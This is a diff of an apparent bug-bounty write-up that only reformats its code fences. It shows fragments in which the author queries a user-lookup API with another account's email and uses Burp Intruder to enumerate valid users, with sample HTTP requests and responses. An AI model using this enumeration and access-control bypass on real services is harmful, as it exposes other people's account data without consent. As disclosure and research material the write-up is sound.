@@ -29,7 +29,7 @@ I have created a test account through the sign up functionality in the applicati
 At the login page after entering the username and password of my signed up user credentials the application sends a request to an API endpoint like below to verify whether the user is part of the organization, user exists in the DB or not.
 
 ### Request
-```
+```http
 GET /api/v1/user?email=nj@tvhsecurity.com HTTP/2
 Host: www.target.com
 Cookie: blah...blah...blah...
@@ -46,7 +46,7 @@ Te: trailers
 ```
 
 ### Response
-```
+```http
 HTTP/1.1 200 OK 
 Date: Wed, 29 Mar 2023 05:59:48 GMT 
 X-Powered-By: Express 
@@ -100,7 +100,7 @@ The below screenshot shows the session storage of **User1** account.
 
 Now i just have to pass the **User2** account email Id in the email verify request and it will provide all the details that i want to do the manipulation.
 
-```
+```http
 GET /api/v1/user?email=nj+1@tvhsecurity.com HTTP/2
 Host: www.target.com
 Cookie: blah...blah...blah...
@@ -139,7 +139,7 @@ I made a list and sent it to intruder and checked the content lenght, luckily fe
 ## Verify User
 
 ### Request
-```
+```http
 GET /api/v1/user?email=ba████████@target.com HTTP/2
 Host: www.target.com
 Cookie: blah...blah...blah...
@@ -156,7 +156,7 @@ Te: trailers
 ```
 
 ### Response
-```
+```http
 HTTP/1.1 200 OK 
 Date: Wed, 29 Mar 2023 05:59:48 GMT 
 X-Powered-By: Express 
